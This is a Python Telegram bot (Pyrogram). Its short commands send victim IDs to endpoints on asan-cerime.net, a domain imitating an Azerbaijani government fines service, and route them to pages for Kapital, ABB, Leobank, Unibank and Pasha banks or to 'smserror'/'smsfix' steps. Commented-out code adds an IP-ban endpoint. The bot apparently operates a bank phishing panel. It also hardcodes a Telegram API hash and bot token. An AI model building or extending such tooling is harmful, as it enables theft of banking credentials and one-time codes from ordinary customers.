import os
import requests
from pyrogram import Client, filters




API_ID = 21220128
API_HASH = "12c6fb5b2392354054cde4c3f338fa6a"
BOT_TOKEN = "asdas:AAEYIhKwLwqYOXvdu9-G6PfmTyJeYmBCEEw"



app = Client("my_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

@app.on_message(filters.command(["k"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asan-cerime.net/crud/kapital/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("Id Yazin /kapital command.")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        
@app.on_message(filters.command(["a"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asan-cerime.net/crud/abb/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("/a id ")
    except Exception as e:
        message.reply_text(f"Error: {e}")
        
@app.on_message(filters.command(["se"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asan-cerime.net/crud/smserror/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("/se id ")
    except Exception as e:
        message.reply_text(f"Error: {e}")

@app.on_message(filters.command(["sf"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asan-cerime.net/crud/smsfix/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("/sf id ")
    except Exception as e:
        message.reply_text(f"Error: {e}")
@app.on_message(filters.command(["l"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asan-cerime.net/crud/leobank/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("/la id ")
    except Exception as e:
        message.reply_text(f"Error: {e}")            
@app.on_message(filters.command(["u"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asan-cerime.net/crud/unibank/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("/la id ")
    except Exception as e:
        message.reply_text(f"Error: {e}")   
        
@app.on_message(filters.command(["l"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asan-cerime.net/crud/leobank/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("/la id ")
    except Exception as e:
        message.reply_text(f"Error: {e}") 
        
@app.on_message(filters.command(["p"]))
def kapital(client, message):
    try:
        number = message.text.split()[1]
        url = f"https://asan-cerime.net/crud/pasha/{number}/"
        response = requests.get(url)

        if response.status_code == 200:
            message.reply_text("Hersey Hazirdir.")
        else:
            message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
    except IndexError:
        message.reply_text("/la id ")
    except Exception as e:
        message.reply_text(f"Error: {e}") 
# @app.on_message(filters.command(["u"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/unibank/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /unibank command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
# @app.on_message(filters.command(["se"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/smserror/{number}"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /se command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        


# @app.on_message(filters.command(["sf"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/smsfix/{number}"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /smsfix command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")



# @app.on_message(filters.command(["p"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/pashabank/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /pashabank command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")




# @app.on_message(filters.command(["error"]))
# def kapital(client, message):
#     try:
#         number = message.text.split()[1]
#         url = f"https://asanodenis.net/crud/error/{number}/"
#         response = requests.get(url)

#         if response.status_code == 200:
#             message.reply_text("Hersey Hazirdir.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Id Yazin /error command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        
        
        
# @app.on_message(filters.command(["ip"]))
# def kapital(client, message):
#     try:
#         ip = message.text.split()[1]
#         url = f"https://asanodenis.net/api/banned_ipssadsad1d21dasdasd12dsadsadsad12dqwd12dsad12dsqd12d/"
#         data = {
#             "ip_address": f"{ip}",
#             "ban_reason": ""
#         }
#         response = requests.post(url,data=data)
#         print(response.text)
#         if response.status_code == 200:
#             message.reply_text(f"Ip uğurla banladı :)\nip:{ip}.")
#         else:
#             message.reply_text(f"Ne ise sehv getdi {response.status_code}.")
#     except IndexError:
#         message.reply_text("Ip Yazin /ip command.")
#     except Exception as e:
#         message.reply_text(f"Error: {e}")
        

app.run()